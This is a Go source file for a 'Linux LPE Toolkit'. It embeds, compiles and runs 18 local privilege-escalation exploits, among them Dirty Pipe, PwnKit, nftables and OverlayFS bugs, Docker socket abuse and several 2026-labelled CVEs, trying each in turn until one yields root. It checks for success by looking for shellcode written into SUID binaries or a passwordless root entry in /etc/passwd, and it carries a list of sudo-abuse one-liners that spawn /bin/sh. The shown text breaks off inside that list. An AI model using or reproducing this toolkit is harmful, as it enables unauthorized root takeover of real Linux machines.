package main

import (
	"context"
	"embed"
	"fmt"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
)

// ── Kernel version ──────────────────────────────────────────────────────────

type KernelVersion struct {
	Major, Minor, Patch int
	Valid               bool
}

func parseKernelVersion(s string) KernelVersion {
	parts := strings.SplitN(s, ".", 3)
	if len(parts) < 2 {
		return KernelVersion{}
	}
	major, err1 := strconv.Atoi(parts[0])
	minor, err2 := strconv.Atoi(parts[1])
	if err1 != nil || err2 != nil {
		return KernelVersion{}
	}
	patch := 0
	if len(parts) >= 3 {
		pp := strings.SplitN(parts[2], "-", 2)
		patch, _ = strconv.Atoi(pp[0])
	}
	return KernelVersion{Major: major, Minor: minor, Patch: patch, Valid: true}
}

func (kv KernelVersion) String() string {
	return fmt.Sprintf("%d.%d.%d", kv.Major, kv.Minor, kv.Patch)
}

func (kv KernelVersion) atLeast(major, minor, patch int) bool {
	if kv.Major != major {
		return kv.Major > major
	}
	if kv.Minor != minor {
		return kv.Minor > minor
	}
	return kv.Patch >= patch
}

func (kv KernelVersion) isFixedBy(versions []string) bool {
	for _, v := range versions {
		fv := parseKernelVersion(v)
		if !fv.Valid {
			continue
		}
		// Same branch: compare patch level
		if kv.Major == fv.Major && kv.Minor == fv.Minor {
			if kv.Patch >= fv.Patch {
				return true
			}
			// Same branch but older patch — not fixed
			return false
		}
		// Different branch: kernel is newer than this fix → keep checking
		if kv.Major > fv.Major || (kv.Major == fv.Major && kv.Minor > fv.Minor) {
			continue
		}
		// Kernel is older than this fix's branch — not fixed
		return false
	}
	// Kernel outranks every fix version — definitely fixed
	return true
}

// ── Distro detection for LTS backport mapping ───────────────────────────────

type DistroInfo struct {
	ID, VersionID string
}

func detectDistro() DistroInfo {
	data, err := os.ReadFile("/etc/os-release")
	if err != nil {
		return DistroInfo{}
	}
	di := DistroInfo{}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "ID=") {
			di.ID = strings.Trim(strings.TrimPrefix(line, "ID="), "\"")
		}
		if strings.HasPrefix(line, "VERSION_ID=") {
			di.VersionID = strings.Trim(strings.TrimPrefix(line, "VERSION_ID="), "\"")
		}
	}
	return di
}

// distroExtraFixed returns additional fix versions to check based on the
// distro's known LTS backport levels.
func distroExtraFixed(distro DistroInfo, kv KernelVersion) []string {
	var extra []string
	switch distro.ID {
	case "ubuntu":
		// Ubuntu LTS kernels with known backport fix levels
		switch distro.VersionID {
		case "22.04":
			// 5.15.0-XXX: check if patch level >= known fix
			if kv.Major == 5 && kv.Minor == 15 {
				extra = append(extra, "5.15.0-135") // approximate
			}
		case "24.04":
			if kv.Major == 6 && kv.Minor == 8 {
				extra = append(extra, "6.8.0-105")
			}
		}
	case "debian":
		switch distro.VersionID {
		case "12":
			if kv.Major == 6 && kv.Minor == 1 {
				extra = append(extra, "6.1.173")
			}
		}
	case "rhel", "centos":
		switch {
		case strings.HasPrefix(distro.VersionID, "9"):
			if kv.Major == 5 && kv.Minor == 14 {
				extra = append(extra, "5.14.0-503")
			}
		case strings.HasPrefix(distro.VersionID, "8"):
			if kv.Major == 4 && kv.Minor == 18 {
				extra = append(extra, "4.18.0-553")
			}
		}
	}
	return extra
}

// ── Embedded exploits ───────────────────────────────────────────────────────

//go:embed exploits/*.c
var exploitFS embed.FS

// ── Exploit definition ──────────────────────────────────────────────────────

type Exploit struct {
	Name         string
	Filename     string
	CompileCmd   []string
	Description  string
	Introduced   string
	FixedIn      []string
	Timeout      time.Duration       // max execution time (0 = default 2m)
	SkipCheck    func() bool
	SuccessCheck func() bool        // nil = use default (isPageCachePwned)
	GoHandler    func(tk *Toolkit) bool // if set, used instead of binary execution
}

// ── Toolkit ──────────────────────────────────────────────────────────────────

type Toolkit struct {
	verbose    bool
	skipped    map[string]bool
	tmpDir     string
	exploits   []Exploit
	compiled   map[string]string
	backupDir  string
}

func NewToolkit(verbose bool, skipped map[string]bool) *Toolkit {
	exploits := []Exploit{
		{
			Name:        "dirtyfrag",
			Filename:    "dirtyfrag.c",
			Description: "CVE-2026-43284+CVE-2026-43500: Dirty Frag - xfrm-ESP/RxRPC page-cache write",
			Introduced:  "4.10",
			FixedIn:     []string{"5.10.255", "5.15.205", "6.1.171", "6.6.138", "6.12.87", "6.18.28", "7.0.5"},
			CompileCmd:  []string{"gcc", "-O0", "-Wall"},
		},
		{
			Name:        "fragnesia",
			Filename:    "fragnesia.c",
			Description: "CVE-2026-46300: Fragnesia - espintcp splice race page-cache corruption",
			Introduced:  "4.10",
			FixedIn:     []string{"5.10.255", "5.15.205", "6.1.171", "6.6.138", "6.12.87", "6.18.28", "7.0.5"},
			CompileCmd:  []string{"gcc", "-O2", "-Wall", "-Wextra", "-static"},
		},
		{
			Name:        "fragnesia_v2",
			Filename:    "fragnesia_v2.c",
			Description: "Fragnesia v2 - skb_segment() SKBFL_SHARED_FRAG stripping",
			Introduced:  "4.10",
			FixedIn:     []string{"5.10.255", "5.15.205", "6.1.171", "6.6.138", "6.12.87", "6.18.28", "7.0.5"},
			CompileCmd:  []string{"gcc", "-O2", "-Wall", "-Wextra", "-std=gnu11", "-static"},
		},
		{
			Name:        "copyfail",
			Filename:    "copyfail.c",
			Description: "CVE-2026-31431: Copy Fail - authencesn AF_ALG + splice page-cache write",
			Introduced:  "4.14",
			FixedIn:     []string{"6.18.22", "6.19.12", "7.0"},
			CompileCmd:  []string{"gcc", "-static", "-O2", "-s"},
			SkipCheck: func() bool {
				return !moduleAvailable("algif_aead") && !moduleAvailable("algif_skcipher")
			},
		},
		{
			Name:        "dirtydecrypt",
			Filename:    "dirtydecrypt.c",
			Description: "CVE-2026-31635: DirtyDecrypt/DirtyCBC - rxgk pagecache write",
			Introduced:  "5.3",
			FixedIn:     []string{"6.18.22"},
			CompileCmd:  []string{"gcc", "-O2"},
		},
		{
			Name:        "pintheft",
			Filename:    "pintheft.c",
			Description: "PinTheft - RDS zerocopy double-free + io_uring page-cache overwrite",
			Introduced:  "5.0",
			FixedIn:     []string{"6.18.20"},
			CompileCmd:  []string{"gcc", "-O2"},
			SkipCheck: func() bool {
				return !moduleAvailable("rds") && !moduleAvailable("rds_tcp")
			},
		},
		{
			Name:        "cve_2026_46333",
			Filename:    "cve_2026_46333.c",
			Description: "CVE-2026-46333: pidfd_getfd FD theft race (SSH keys/shadow)",
			Introduced:  "5.6",
			FixedIn:     []string{"5.10.256", "5.15.207", "6.1.173", "6.6.139", "6.12.89", "6.18.31", "7.0.8"},
			CompileCmd:  []string{"gcc", "-O2"},
			SuccessCheck: func() bool {
				return checkFDRaceSucceeded()
			},
		},
		{
			Name:        "dirtypipe",
			Filename:    "dirtypipe.c",
			Description: "CVE-2022-0847: Dirty Pipe - /etc/passwd page-cache write",
			Introduced:  "5.8",
			FixedIn:     []string{"5.10.102", "5.15.25", "5.16.11"},
			CompileCmd:  []string{"gcc", "-O2", "-static"},
		},
		{
			Name:        "cve_2021_4034",
			Filename:    "cve_2021_4034.c",
			Description: "CVE-2021-4034: PwnKit - pkexec environment escape",
			Introduced:  "2.6",
			CompileCmd:  []string{"gcc", "-O2", "-static"},
			SkipCheck: func() bool {
				_, err := exec.LookPath("gcc")
				return err != nil
			},
			SuccessCheck: func() bool { return true },
		},
		{
			Name:        "cve_2021_3493",
			Filename:    "cve_2021_3493.c",
			Description: "CVE-2021-3493: OverlayFS user-ns mount escape",
			Introduced:  "3.18",
			FixedIn:     []string{"5.11"},
			CompileCmd:  []string{"gcc", "-O2", "-static"},
			SuccessCheck: func() bool { return true },
		},
		{
			Name:        "cve_2023_0386",
			Filename:    "cve_2023_0386_exp.c",
			Description: "CVE-2023-0386: OverlayFS+FUSE mount escape",
			Introduced:  "5.11",
			FixedIn:     []string{"6.2"},
			CompileCmd:  []string{"gcc", "-O2", "-static"},
			SuccessCheck: func() bool { return true },
		},
		{
			Name:        "cve_2021_22555",
			Filename:    "cve_2021_22555.c",
			Description: "CVE-2021-22555: netfilter OOB write (needs -m32)",
			Introduced:  "2.6.19",
			FixedIn:     []string{"5.10"},
			CompileCmd:  []string{"gcc", "-O2", "-static", "-m32"},
			SuccessCheck: func() bool { return true },
		},
		{
			Name:        "cve_2022_2586",
			Filename:    "cve_2022_2586.c",
			Description: "CVE-2022-2586: nftables chain UAF (needs libmnl/nftnl)",
			Introduced:  "3.16",
			FixedIn:     []string{"5.19"},
			CompileCmd:  []string{"gcc", "-O2", "-lmnl", "-lnftnl"},
			SuccessCheck: func() bool { return true },
		},
		{
			Name:        "cve_2024_1086",
			Filename:    "cve_2024_1086/src/main.c",
			Description: "CVE-2024-1086: nftables UAF (Notselwyn, multi-file)",
			Introduced:  "3.15",
			FixedIn:     []string{"6.8"},
			Timeout:     30 * time.Second,
			CompileCmd:  []string{"gcc"},
			SkipCheck: func() bool {
				_, err := precompiledFS.ReadFile(filepath.Join("exploits/bin", runtime.GOARCH, "cve_2024_1086"))
				return err != nil
			},
			SuccessCheck: func() bool { return true },
		},
		{
			Name:        "cve_2025_38352",
			Filename:    "cve_2025_38352.c",
			Description: "CVE-2025-38352: POSIX CPU timer race trigger (PoC only)",
			Introduced:  "2.6.36",
			CompileCmd:  []string{"gcc", "-O2", "-static", "-lpthread"},
		},
		{
			Name:        "cve_2021_3560",
			Filename:    "cve_2021_3560.c",
			Description: "CVE-2021-3560: Polkit accounts-daemon D-Bus race",
			Introduced:  "2.6",
			CompileCmd:  []string{"gcc", "-O2", "-static"},
			SkipCheck: func() bool {
				_, err := exec.LookPath("dbus-send")
				return err != nil
			},
			SuccessCheck: func() bool { return true },
		},
		{
			Name:        "docker_sock",
			Filename:    "docker_sock.c",
			Description: "Docker socket abuse - writable /var/run/docker.sock",
			Introduced:  "2.6",
			CompileCmd:  []string{"gcc", "-O2", "-static"},
			SkipCheck: func() bool {
				_, err := os.Stat("/var/run/docker.sock")
				return err != nil
			},
			SuccessCheck: func() bool { return true },
		},
		{
			Name:        "gtfobins",
			Description: "GTFOBins: passwordless sudo abuse (80+ techniques)",
			Introduced:  "",
			SkipCheck: func() bool {
				_, err := exec.LookPath("sudo")
				return err != nil
			},
			SuccessCheck: func() bool { return true },
			GoHandler:    handleGTFOBins,
		},
	}

	tmpDir, err := os.MkdirTemp("", "lpe-toolkit-*")
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to create temp dir: %v\n", err)
		os.Exit(1)
	}

	tk := &Toolkit{
		verbose:  verbose,
		skipped:  skipped,
		tmpDir:   tmpDir,
		exploits: exploits,
		compiled: make(map[string]string),
	}

	return tk
}

func (tk *Toolkit) log(format string, args ...interface{}) {
	if tk.verbose {
		fmt.Fprintf(os.Stderr, "[*] "+format+"\n", args...)
	}
}

// ── Binary resolution: pre-compiled vs runtime compile ──────────────────────

func (tk *Toolkit) resolveBinary(exp Exploit) (string, error) {
	// Pre-compiled: try exploits/bin/<name>.<GOARCH>
	arch := runtime.GOARCH
	data, err := precompiledFS.ReadFile(filepath.Join("exploits/bin", arch, exp.Name))
	if err == nil && len(data) > 0 {
		binPath := filepath.Join(tk.tmpDir, exp.Name)
		if err := os.WriteFile(binPath, data, 0755); err != nil {
			return "", fmt.Errorf("write pre-compiled binary: %w", err)
		}
		tk.log("Using pre-compiled binary for %s (%s, %d bytes)", exp.Name, arch, len(data))
		if err := tk.resolveMultiBinaries(exp); err != nil {
			return binPath, err
		}
		return binPath, nil
	}

	// Fallback: compile from embedded C source at runtime
	tk.log("No pre-compiled binary for %s/%s, compiling from source", exp.Name, arch)
	binPath, err := tk.compile(exp)
	if err != nil {
		return "", err
	}
	if err := tk.resolveMultiBinaries(exp); err != nil {
		return binPath, err
	}
	return binPath, nil
}

func (tk *Toolkit) resolveMultiBinaries(exp Exploit) error {
	if exp.Name != "cve_2023_0386" {
		return nil
	}
	extras := []struct {
		name, src string
		cc        []string
	}{
		{"cve_2023_0386_fuse", "cve_2023_0386_fuse.c", []string{"gcc", "-O2"}},
		{"cve_2023_0386_gc", "cve_2023_0386_gc.c", []string{"gcc", "-O2", "-static"}},
	}
	for _, ex := range extras {
		extraExp := Exploit{Name: ex.name, Filename: ex.src, CompileCmd: ex.cc}
		if _, err := tk.resolveBinary(extraExp); err != nil {
			return fmt.Errorf("extra %s: %w", ex.name, err)
		}
	}
	return nil
}

func (tk *Toolkit) compile(exp Exploit) (string, error) {
	srcBytes, err := exploitFS.ReadFile(filepath.Join("exploits", exp.Filename))
	if err != nil {
		return "", fmt.Errorf("read embedded source: %w", err)
	}

	srcPath := filepath.Join(tk.tmpDir, exp.Filename)
	if err := os.MkdirAll(filepath.Dir(srcPath), 0755); err != nil {
		return "", fmt.Errorf("create source dir: %w", err)
	}
	if err := os.WriteFile(srcPath, srcBytes, 0644); err != nil {
		return "", fmt.Errorf("write source: %w", err)
	}

	binPath := filepath.Join(tk.tmpDir, exp.Name)
	args := append([]string{}, exp.CompileCmd[1:]...)
	args = append(args, "-o", binPath, srcPath)
	if exp.Name == "dirtyfrag" {
		args = append(args, "-lutil")
	}

	cmd := exec.Command(exp.CompileCmd[0], args...)
	cmd.Stdout = nil
	cmd.Stderr = nil
	if tk.verbose {
		cmd.Stdout = os.Stderr
		cmd.Stderr = os.Stderr
	}

	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("compile: %w", err)
	}

	return binPath, nil
}

// ── SUID binary backup / restore ────────────────────────────────────────────

var suidPaths = []string{
	"/usr/bin/su", "/bin/su", "/usr/bin/mount", "/usr/bin/passwd",
}

func (tk *Toolkit) backupSUID() {
	tk.backupDir = filepath.Join(tk.tmpDir, "backup")
	os.MkdirAll(tk.backupDir, 0700)
	for _, p := range suidPaths {
		data, err := os.ReadFile(p)
		if err != nil {
			continue
		}
		// Preserve only first 4KB (enough to detect shellcode at 0x78)
		if len(data) > 4096 {
			data = data[:4096]
		}
		name := strings.ReplaceAll(strings.TrimPrefix(p, "/"), "/", "_")
		os.WriteFile(filepath.Join(tk.backupDir, name), data, 0644)
		tk.log("Backed up %s", p)
	}
}

func (tk *Toolkit) restoreSUID() {
	if tk.backupDir == "" {
		return
	}
	for _, p := range suidPaths {
		name := strings.ReplaceAll(strings.TrimPrefix(p, "/"), "/", "_")
		bak := filepath.Join(tk.backupDir, name)
		data, err := os.ReadFile(bak)
		if err != nil {
			continue
		}
		if err := os.WriteFile(p, data, 0755); err != nil {
			tk.log("Failed to restore %s: %v", p, err)
		} else {
			// Preserve SUID bit that the original binary had
			os.Chmod(p, os.ModeSetuid|0755)
			tk.log("Restored %s from backup", p)
		}
	}
}

func (tk *Toolkit) dropCaches() {
	if err := os.WriteFile("/proc/sys/vm/drop_caches", []byte("3\n"), 0644); err != nil {
		tk.log("Failed to drop caches: %v", err)
	} else {
		fmt.Println("[+] Page cache dropped - system restored")
	}
}

// ── Success checks ──────────────────────────────────────────────────────────

func isPageCachePwned() bool {
	shellcodeSig := []byte{0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a}
	shellcodeSig2 := []byte{0x31, 0xff, 0xb0, 0x69}
	for _, p := range suidPaths {
		fd, err := os.Open(p)
		if err != nil {
			continue
		}
		buf := make([]byte, 16)
		n, _ := fd.ReadAt(buf, 0x78)
		fd.Close()
		if n >= 8 {
			if bytesEqual(buf[:8], shellcodeSig) {
				return true
			}
			if bytesEqual(buf[:4], shellcodeSig2) {
				return true
			}
		}
	}
	passwd, err := os.ReadFile("/etc/passwd")
	if err == nil && len(passwd) > 9 {
		if passwd[0] == 'r' && passwd[1] == 'o' && passwd[2] == 'o' &&
			passwd[3] == 't' && passwd[4] == ':' && passwd[5] == ':' &&
			passwd[6] == '0' && passwd[7] == ':' && passwd[8] == '0' {
			return true
		}
	}
	return false
}

// isFDRaceSucceeded checks if CVE-2026-46333 output contained our success marker.
// We write a marker file so the check is independent of capturing stdout.
var fdRaceMarker = filepath.Join(os.TempDir(), ".lpe_fdrace_ok")

func checkFDRaceSucceeded() bool {
	_, err := os.Stat(fdRaceMarker)
	if err == nil {
		os.Remove(fdRaceMarker)
		return true
	}
	return false
}

func markFDRaceSucceeded() {
	os.WriteFile(fdRaceMarker, []byte("ok"), 0644)
}

func bytesEqual(a, b []byte) bool {
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

// ── Exploit runner ──────────────────────────────────────────────────────────

func (tk *Toolkit) runExploit(exp Exploit, binary string) bool {
	timeout := exp.Timeout
	if timeout <= 0 {
		timeout = 30 * time.Second
	}
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, binary)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin

	// Multi-binary exploits run from tmpDir so extra binaries are in CWD
	if exp.Name == "cve_2023_0386" {
		cmd.Dir = tk.tmpDir
	}

	err := cmd.Run()

	if exp.SuccessCheck != nil {
		if err != nil {
			if ctx.Err() == context.DeadlineExceeded {
				tk.log("Exploit timed out after %v", timeout)
			} else {
				tk.log("Exploit exited with error: %v", err)
			}
			return false
		}
		return exp.SuccessCheck()
	}

	// Default: check for page cache contamination
	if err == nil {
		if isPageCachePwned() {
			return true
		}
		tk.log("Exploit exited 0 but no patch detected")
		return false
	}
	if isPageCachePwned() {
		tk.log("Page cache pwned despite exploit error")
		return true
	}
	tk.log("Exploit exited: %v", err)
	return false
}

// ── Print plan (--dry-run) ──────────────────────────────────────────────────

func (tk *Toolkit) PrintPlan() {
	kv := parseKernelVersion(tk.kernelVersion())
	distro := detectDistro()
	fmt.Printf("Kernel: %s (%s)\n", tk.kernelVersion(), kv)
	if distro.ID != "" {
		fmt.Printf("Distro: %s %s\n", distro.ID, distro.VersionID)
	}
	fmt.Printf("Arch:   %s\n\n", runtime.GOARCH)
	fmt.Println("Exploits (in definition order):")
	for _, exp := range tk.exploits {
		reason := ""
		if tk.skipped[exp.Name] {
			reason = " [SKIPPED by user]"
		} else if !tk.isKernelSupported(exp, kv) {
			reason = fmt.Sprintf(" [SKIPPED kernel outside range]")
		}
		var mode string
		if exp.GoHandler != nil {
			mode = "go-handler"
		} else if _, err := precompiledFS.ReadFile(filepath.Join("exploits/bin", runtime.GOARCH, exp.Name)); err == nil {
			mode = "pre-built"
		} else {
			mode = "compile"
		}
		fmt.Printf("  %-20s (introduced %-5s) [%s]%s\n", exp.Name, exp.Introduced, mode, reason)
	}
}

// ── Main entry ──────────────────────────────────────────────────────────────

func (tk *Toolkit) Run() {
	defer tk.Cleanup()

	fmt.Printf(`
╔══════════════════════════════════════════════════════════╗
║      Linux LPE Toolkit - 18 exploits loaded              ║
╠══════════════════════════════════════════════════════════╣
║  1. Copy Fail      CVE-2026-31431   AF_ALG + splice    ║
║  2. Dirty Frag     CVE-2026-43284   xfrm-ESP/RxRPC     ║
║  3. Fragnesia      CVE-2026-46300   espintcp splice    ║
║  4. DirtyDecrypt   CVE-2026-31635   rxgk pagecache     ║
║  5. Fragnesia v2   skb_segment      GRO coalesce       ║
║  6. PinTheft       RDS zcopy        io_uring overwrite ║
║  7. Dirty Pipe     CVE-2022-0847   /etc/passwd overwr  ║
║  8. PwnKit         CVE-2021-4034   pkexec env escape  ║
║  9. OverlayFS      CVE-2021-3493   user-ns mount      ║
║ 10. OvFS+FUSE      CVE-2023-0386   FUSE mount escape  ║
║ 11. Polkit D-Bus   CVE-2021-3560   accounts-daemon    ║
║ 12. Docker Socket  (misconfig)     docker.sock abuse  ║
║ 13. netfilter OOB  CVE-2021-22555  ip_tables corrupt  ║
║ 14. nft UAF2       CVE-2022-2586   nftables chain     ║
║ 15. pidfd race     CVE-2026-46333  ssh-keysign/shadow ║
║ 16. CPU Timer Race CVE-2025-38352  POSIX timer race   ║
║ 17. nft UAF        CVE-2024-1086   Notselwyn multi-f  ║
║ 18. GTFOBins       sudo abuse      80+ techniques      ║
╚══════════════════════════════════════════════════════════╝

[*] Detected kernel: %s
[*] Architecture:   %s
[*] Binary mode:    %s

`, tk.kernelVersion(), runtime.GOARCH, tk.binaryMode())

	kv := parseKernelVersion(tk.kernelVersion())
	distro := detectDistro()

	// Resolve (compile or extract) all usable exploits
	tk.log("Resolving exploit binaries...")
	for _, exp := range tk.exploits {
		if tk.skipped[exp.Name] {
			fmt.Printf("[-] Skipping %s (user requested)\n", exp.Name)
			continue
		}
		if !tk.isKernelSupported(exp, kv) {
			fmt.Printf("[-] Skipping %s (kernel %s not in vulnerable range)\n", exp.Name, kv)
			continue
		}
		if !tk.isDistroSupported(exp, distro, kv) {
			fmt.Printf("[-] Skipping %s (distro kernel appears patched)\n", exp.Name)
			continue
		}
		if exp.SkipCheck != nil && exp.SkipCheck() {
			fmt.Printf("[-] Skipping %s (prerequisites not met)\n", exp.Name)
			continue
		}

		if exp.GoHandler != nil {
			tk.compiled[exp.Name] = ""
			fmt.Printf("[+] %s: ready (go-handler)\n", exp.Name)
			continue
		}

		binary, err := tk.resolveBinary(exp)
		if err != nil {
			fmt.Printf("[-] %s: resolve failed: %v\n", exp.Name, err)
			continue
		}
		tk.compiled[exp.Name] = binary
		fmt.Printf("[+] %s: ready (%s)\n", exp.Name, filepath.Base(binary))
	}

	if len(tk.compiled) == 0 {
		fmt.Println("\n[-] No exploits could be resolved. Exiting.")
		return
	}

	// Backup SUID binaries before running any exploit
	tk.backupSUID()

	fmt.Printf("\n[*] Beginning exploit runs (%d available)...\n", len(tk.compiled))
	fmt.Println("[*] Each exploit will be tried until one escalates to root.")

	for _, exp := range tk.exploits {
		binary, ok := tk.compiled[exp.Name]
		if !ok {
			continue
		}

		fmt.Printf("\n═══════════════════════════════════════════\n")
		fmt.Printf("  Trying: %s\n", exp.Name)
		fmt.Printf("  %s\n", exp.Description)
		fmt.Printf("═══════════════════════════════════════════\n\n")

		var succeeded bool
		if exp.GoHandler != nil {
			succeeded = exp.GoHandler(tk)
		} else {
			succeeded = tk.runExploit(exp, binary)
		}

		if succeeded {
			if exp.SuccessCheck == nil && exp.GoHandler == nil {
				// Page-cache exploit: the exploit binary itself provides
				// an interactive root shell (via patched SUID binary).
				// That shell has already exited by now, so just inform
				// the user and clean up.
				fmt.Printf("\n[+] %s succeeded! Page cache contaminated.\n", exp.Name)
				fmt.Println("[!] You were already root in the exploit's shell.")
				fmt.Println("[!] Run 'su' in your terminal to regain root while cache is hot.")
			} else {
				// FD-race or GTFOBins exploit
				fmt.Printf("\n[+] %s succeeded!\n", exp.Name)
			}

			if os.Geteuid() == 0 {
				tk.restoreSUID()
				tk.dropCaches()
			} else {
				fmt.Println("[!] Run as root to auto-restore SUID binaries and drop caches.")
			}
			return
		}

		fmt.Printf("[-] %s did not succeed on this system\n", exp.Name)
	}

	fmt.Println("\n[-] All exploits failed on this system.")
	tk.restoreSUID()
}

func (tk *Toolkit) binaryMode() string {
	_, err := precompiledFS.ReadFile(filepath.Join("exploits/bin", runtime.GOARCH, "dirtyfrag"))
	if err == nil {
		return "standalone (pre-compiled, no gcc needed)"
	}
	return "runtime compile (gcc required on target)"
}

// ── Pre-checks ──────────────────────────────────────────────────────────────

func (tk *Toolkit) isKernelSupported(exp Exploit, kv KernelVersion) bool {
	if !kv.Valid {
		return true
	}
	if exp.Introduced != "" {
		iv := parseKernelVersion(exp.Introduced)
		if !kv.atLeast(iv.Major, iv.Minor, iv.Patch) {
			tk.log("Kernel %s too old for %s (need >= %s)", kv, exp.Name, exp.Introduced)
			return false
		}
	}
	if len(exp.FixedIn) > 0 {
		if kv.isFixedBy(exp.FixedIn) {
			tk.log("Kernel %s fixed for %s (patched in %v)", kv, exp.Name, exp.FixedIn)
			return false
		}
	}
	return true
}

func (tk *Toolkit) isDistroSupported(exp Exploit, distro DistroInfo, kv KernelVersion) bool {
	if distro.ID == "" || !kv.Valid {
		return true
	}
	extra := distroExtraFixed(distro, kv)
	if len(extra) == 0 {
		return true
	}
	fullVersion := tk.kernelVersion()
	for _, fix := range extra {
		if versionAtLeast(fullVersion, fix) {
			tk.log("Distro %s %s kernel %s >= fix %s for %s", distro.ID, distro.VersionID, fullVersion, fix, exp.Name)
			return false
		}
	}
	return true
}

// versionAtLeast compares two version strings with full distro sub-patch support.
// "5.15.0-50" < "5.15.0-135", "6.8.0-100" >= "6.8.0-100".
func versionAtLeast(v1, v2 string) bool {
	kv1 := parseKernelVersion(v1)
	kv2 := parseKernelVersion(v2)
	if kv1.Major != kv2.Major {
		return kv1.Major > kv2.Major
	}
	if kv1.Minor != kv2.Minor {
		return kv1.Minor > kv2.Minor
	}
	if kv1.Patch != kv2.Patch {
		return kv1.Patch > kv2.Patch
	}
	return distroSubpatch(v1) >= distroSubpatch(v2)
}

// distroSubpatch extracts the -NNN sub-patch from a version like "6.8.0-50-generic".
func distroSubpatch(version string) int {
	parts := strings.SplitN(version, ".", 3)
	if len(parts) < 3 {
		return 0
	}
	pp := strings.SplitN(parts[2], "-", 3)
	if len(pp) >= 2 {
		n, err := strconv.Atoi(pp[1])
		if err == nil {
			return n
		}
	}
	return 0
}

func (tk *Toolkit) kernelVersion() string {
	var uts syscall.Utsname
	if err := syscall.Uname(&uts); err != nil {
		return "unknown"
	}
	release := make([]byte, 0, len(uts.Release))
	for _, b := range uts.Release {
		if b == 0 {
			break
		}
		release = append(release, byte(b))
	}
	return string(release)
}

func (tk *Toolkit) Cleanup() {
	os.RemoveAll(tk.tmpDir)
	os.Remove(fdRaceMarker)
}

// JustBuild resolves all usable exploits and prints their paths.
// Useful for packaging: --just-build --skip <disabled> shows what's ready.
func (tk *Toolkit) JustBuild() {
	kv := parseKernelVersion(tk.kernelVersion())
	fmt.Printf("Kernel: %s (%s)\n", tk.kernelVersion(), kv)
	fmt.Println("Resolving exploits...")

	var ready []string
	for _, exp := range tk.exploits {
		if tk.skipped[exp.Name] {
			fmt.Printf("  %-20s SKIPPED (user)\n", exp.Name)
			continue
		}
		if !tk.isKernelSupported(exp, kv) {
			fmt.Printf("  %-20s SKIPPED (kernel range)\n", exp.Name)
			continue
		}
		if exp.SkipCheck != nil && exp.SkipCheck() {
			fmt.Printf("  %-20s SKIPPED (prerequisites)\n", exp.Name)
			continue
		}
		if exp.GoHandler != nil {
			fmt.Printf("  %-20s OK (go-handler)\n", exp.Name)
			continue
		}
		bin, err := tk.resolveBinary(exp)
		if err != nil {
			fmt.Printf("  %-20s FAILED: %v\n", exp.Name, err)
			continue
		}
		ready = append(ready, bin)
		fmt.Printf("  %-20s OK (%s)\n", exp.Name, bin)
	}

	mode := tk.binaryMode()
	fmt.Printf("\n%d exploits ready. Mode: %s\n", len(ready), mode)
}

func moduleAvailable(name string) bool {
	entries, err := os.ReadDir("/sys/module")
	if err != nil {
		return false
	}
	for _, e := range entries {
		if e.Name() == name {
			return true
		}
	}
	probe := exec.Command("modprobe", "--dry-run", name)
	if err := probe.Run(); err == nil {
		return true
	}
	return false
}

// ── GTFOBins sudo abuse ────────────────────────────────────────────────────

type gtfobinTechnique struct {
	binary string
	args   []string
	env    []string // "KEY=VALUE" pairs
}

var gtfobinsTechniques = []gtfobinTechnique{
	// Shells — just run the shell
	{"ash", nil, nil},
	{"bash", nil, nil},
	{"dash", nil, nil},
	{"ksh", nil, nil},
	{"zsh", nil, nil},
	{"sh", nil, nil},

	// Interpreters
	{"awk", []string{"BEGIN {system(\"/bin/sh\")}"}, nil},
	{"gawk", []string{"BEGIN {system(\"/bin/sh\")}"}, nil},
	{"mawk", []string{"BEGIN {system(\"/bin/sh\")}"}, nil},
	{"nawk", []string{"BEGIN {system(\"/bin/sh\")}"}, nil},
	{"perl", []string{"-e", "exec '/bin/sh'"}, nil},
	{"python", []string{"-c", "import os; os.system('/bin/sh')"}, nil},
	{"python2", []string{"-c", "import os; os.system('/bin/sh')"}, nil},
	{"python3", []string{"-c", "import os; os.system('/bin/sh')"}, nil},
	{"ruby", []string{"-e", "exec '/bin/sh'"}, nil},
	{"lua", []string{"-e", "os.execute('/bin/sh')"}, nil},
	{"php", []string{"-r", "system(getenv('PWN'));"}, []string{"PWN=/bin/sh"}},
	{"node", []string{"-e", "require('child_process').execSync('/bin/sh', {stdio:[0,1,2]})"}, nil},

	// Binary tools — direct shell spawning via various flags
	{"busybox", []string{"sh"}, nil},
	{"capsh", []string{"--"}, nil},
	{"env", []string{"/bin/sh"}, nil},
	{"expect", []string{"-c", "spawn /bin/sh;interact"}, nil},
	{"find", []string{".", "-exec", "/bin/sh", ";", "-quit"}, nil},
	{"flock", []string{"-u", "/", "/bin/sh"}, nil},
	{"gcc", []string{"-wrapper", "/bin/sh,-s", "."}, nil},
	{"gdb", []string{"-nx", "-ex", "!sh", "-ex", "quit"}, nil},
	{"ionice", []string{"/bin/sh"}, nil},
	{"ltrace", []string{"-b", "-L", "/bin/sh"}, nil},
	{"nice", []string{"/bin/sh"}, nil},
	{"nohup", []string{"/bin/sh", "-c", "sh <$(tty) >$(tty) 2>$(tty)"}, nil},
	{"nsenter", []string{"/bin/sh"}, nil},
	{"script", []string{"-q", "/dev/null"}, nil},
	{"sed", []string{"-n", "1e exec sh 1>&0", "/etc/hosts"}, nil},
	{"setarch", []string{"x86_64", "/bin/sh"}, nil},
	{"socat", []string{"stdin", "exec:/bin/sh"}, nil},
	{"split", []string{"--filter=/bin/sh", "/dev/stdin"}, nil},
	{"sqlite3", []string{"/dev/null", ".shell /bin/sh"}, nil},
	{"stdbuf", []string{"-i0", "/bin/sh"}, nil},
	{"strace", []string{"-o", "/dev/null", "/bin/sh"}, nil},
	{"taskset", []string{"1", "/bin/sh"}, nil},
	{"time", []string{"/bin/sh"}, nil},
	{"timeout", []string{"7d", "/bin/sh"}, nil},
	{"unshare", []string{"/bin/sh"}, nil},
	{"valgrind", []string{"/bin/sh"}, nil},
